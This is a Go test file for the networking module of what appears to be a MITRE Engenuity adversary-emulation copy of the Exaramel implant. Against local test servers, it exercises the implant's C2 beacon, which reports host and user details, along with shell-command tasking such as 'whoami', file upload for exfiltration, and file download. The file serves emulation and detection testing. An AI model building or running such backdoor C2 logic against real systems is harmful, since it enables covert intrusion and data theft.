package networker_test

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"testing"

	"attackevals.mitre-engenuity.org/exaramel/configur"
	"attackevals.mitre-engenuity.org/exaramel/logger"
	"attackevals.mitre-engenuity.org/exaramel/networker"
	"github.com/google/go-cmp/cmp"
)

var exampleAuth networker.AuthStruct

// Sets example agent values to use in test comms
func setTestAuthValues() error {
	platform, err := exec.Command("uname", "-a").Output()
	if err != nil {
		return err
	}
	curr_dir, err := os.Getwd()
	if err != nil {
		return err
	}
	exampleAuth = networker.AuthStruct{
		Guid:       "exaramel-implant",
		Whoami:     "myUserName",
		Platform:   string(platform),
		Version:    "0.1",
		Generation: "1",
		IP:         configur.GetOutboundIP(),
		PID:        strconv.Itoa(os.Getpid()),
		PPID:       strconv.Itoa(os.Getppid()),
		Dir:        curr_dir,
	}
	networker.SetAuthValues(exampleAuth.Guid, exampleAuth.Whoami, exampleAuth.Platform, exampleAuth.IP, exampleAuth.PID, exampleAuth.PPID, exampleAuth.Dir)
	return nil
}

// Helper function to return server error to client
func writeError(w http.ResponseWriter, e error) {
	var respErr networker.RespError
	respErr.Error.Code = 1
	respErr.Error.Message = e.Error()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(respErr)
}

// Testing if registration beacon is sent properly, and if server response is handled correctly.
func TestPostAuthBeacon(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	var respAuth networker.RespAuth
	respAuth.Auth.GUID = exampleAuth.Guid
	respAuth.Auth.AuthResult = 1

	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		headerContentType := r.Header.Get("Content-Type")
		if headerContentType != "application/x-www-form-urlencoded" {
			err := errors.New("Content Type not application/x-www-form-urlencoded")
			writeError(w, err)
			t.Error(err)
			return
		}

		r.ParseForm()

		receivedAuth := networker.AuthStruct{
			Guid:       r.FormValue("guid"),
			Whoami:     r.FormValue("whoami"),
			Platform:   r.FormValue("platform"),
			Version:    "0.1",
			Generation: "1",
			IP:         r.FormValue("ip"),
			PID:        r.FormValue("pid"),
			PPID:       r.FormValue("ppid"),
			Dir:        r.FormValue("dir"),
		}

		logger.Info("Retrieved IP is " + receivedAuth.IP)

		if !cmp.Equal(exampleAuth, receivedAuth) {
			err := fmt.Errorf("Auth values did not match as expected.\nActual/Expected\n- guid: %v / %v\n- user: %v / %v\n- platform: %v / %v\n- ip: %v / %v\n- pid: %v / %v,\n- ppid: %v / %v\n- dir: %v / %v\n", receivedAuth.Guid, exampleAuth.Guid, receivedAuth.Whoami, exampleAuth.Whoami, receivedAuth.Platform, exampleAuth.Platform, receivedAuth.IP, exampleAuth.IP, receivedAuth.PID, exampleAuth.PID, receivedAuth.PPID, exampleAuth.PPID, receivedAuth.Dir, exampleAuth.Dir)
			writeError(w, err)
			t.Error(err)
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(respAuth)
	}))
	defer server.Close()

	networker.SetC2Server(server.URL)
	if err := networker.PostAuthBeacon(); err != nil {
		t.Error(err)
	}
}

// Testing request and processing of tasks
func TestGetTasks(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	var tasks = networker.Tasks{
		Response: []networker.TaskResponse{
			{
				ID:                1,
				Method:            "OS.ShellExecute",
				Arguments:         "whoami",
				Attachment:        0,
				AnswerWait:        0,
				DoAsync:           0,
				AnswerImmediately: 0,
				WaitOutputTime:    0,
			},
		},
	}

	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if guid := strings.SplitN(r.URL.String(), "/", 3)[2]; guid != exampleAuth.Guid {
			err := fmt.Errorf("GetTask guid in URL did not match actual guid (exaramel-implant): %v", r.URL)
			writeError(w, err)
			t.Error(err)
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(tasks)
	}))
	defer server.Close()

	networker.SetC2Server(server.URL)
	returnedTasks, err := networker.GetTasks()
	if err != nil {
		t.Error(err)
	}
	if !cmp.Equal(returnedTasks, tasks) {
		t.Error(fmt.Errorf("Returned Tasks did not match Expected tasks.\nReturned Tasks: %+v\nExpected Tasks: %+v", returnedTasks, tasks))
	}
}

// Testing the submission of a task's coutput
func TestSendReportResult(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	var reportResp networker.Reports
	reportResp.Response.ID = exampleAuth.Guid
	reportResp.Response.CommandID = 1
	reportResp.Response.Status = 1

	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		guid := r.FormValue("guid")
		if guid != exampleAuth.Guid {
			err := fmt.Errorf("Guid didn't match! Received: %v", guid)
			writeError(w, err)
			t.Error(err)
			return
		}
		taskIdStr := r.FormValue("task_id")
		taskIdInt, err := strconv.Atoi(taskIdStr)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		if taskIdInt != 1 {
			t.Error(fmt.Errorf("TaskID didn't match! Received %v", taskIdInt))
		}

		outputContents := r.FormValue("file")
		if outputContents != "test output" {
			t.Error(fmt.Errorf("output contents didn't match: %v", outputContents))
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(reportResp)
	}))
	defer server.Close()

	networker.SetC2Server(server.URL)
	actualReportResp, err := networker.SendReport(uint32(1), "test output", false)
	if err != nil {
		t.Error(err)
	}
	if !cmp.Equal(actualReportResp, reportResp) {
		t.Error(fmt.Errorf("Returned Reports did not match Expected Reports.\nReturned Reports: %+v\nExpected Reports: %+v", actualReportResp, reportResp))
	}
}

// Testing submitting a file as a result of a IO.ReadFile command
func TestSendReportFile(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}
	var reportResp networker.Reports
	reportResp.Response.ID = exampleAuth.Guid
	reportResp.Response.CommandID = 1
	reportResp.Response.Status = 1

	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		err := r.ParseMultipartForm(32 << 20)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		guid := r.FormValue("guid")
		if guid != exampleAuth.Guid {
			err := fmt.Errorf("Guid didn't match! Received: %v", guid)
			writeError(w, err)
			t.Error(err)
			return
		}
		taskIdStr := r.FormValue("task_id")
		taskIdInt, err := strconv.Atoi(taskIdStr)
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		if taskIdInt != 1 {
			t.Error(fmt.Errorf("TaskID didn't match! Received %v", taskIdInt))
		}

		file, handler, err := r.FormFile("file")
		if err != nil {
			writeError(w, err)
			t.Error(err)
			return
		}
		defer file.Close()
		var outputContents bytes.Buffer
		io.Copy(&outputContents, file)

		filename := handler.Filename

		if filename != "go.mod" {
			err := fmt.Errorf("Filename didn't match: %v", filename)
			writeError(w, err)
			t.Error(err)
			return
		}

		fileContents, err := ioutil.ReadFile("../go.mod")
		if err != nil {
			writeError(w, err)
			t.Error(err)
		}

		if outputContents.String() != string(fileContents[:]) {
			err := fmt.Errorf("output contents didn't match\nReceived: %v\nActual: %v", outputContents, fileContents)
			writeError(w, err)
			t.Error(err)
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(reportResp)
	}))
	defer server.Close()

	networker.SetC2Server(server.URL)
	actualReportResp, err := networker.SendReport(uint32(1), "../go.mod", true)
	if err != nil {
		t.Error(err)
	}
	if !cmp.Equal(actualReportResp, reportResp) {
		t.Error(fmt.Errorf("Returned Reports did not match Expected Reports.\nReturned Reports: %+v\nExpected Reports: %+v", actualReportResp, reportResp))
	}
}

// Testing client's request for a file from the server
func TestGetFile(t *testing.T) {
	if err := setTestAuthValues(); err != nil {
		t.Error(err)
	}

	fileContents := "This is dummy file content"

	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		urlParts := strings.SplitN(r.URL.String(), "/", 4)
		guid := urlParts[2]
		taskId := urlParts[3]
		if guid != exampleAuth.Guid {
			err := fmt.Errorf("GetTask guid in URL did not match actual guid (exaramel-implant): %v", guid)
			writeError(w, err)
			t.Error(err)
			return
		}
		if taskId != "1" {
			err := fmt.Errorf("GetTask taskId in URL did not match actual taskId (1): %v", taskId)
			writeError(w, err)
			t.Error(err)
			return
		}
		fmt.Fprint(w, fileContents)
	}))
	defer server.Close()

	networker.SetC2Server(server.URL)
	returnedFileContents, err := networker.GetFile(uint32(1))
	if err != nil {
		t.Error(err)
	}
	if string(returnedFileContents[:]) != fileContents {
		t.Error(fmt.Errorf("Returned FileContents did not match Expected FileContents.\nReturned FileContents: %+v\nExpected FileContents: %+v", string(returnedFileContents[:]), fileContents))
	}
}
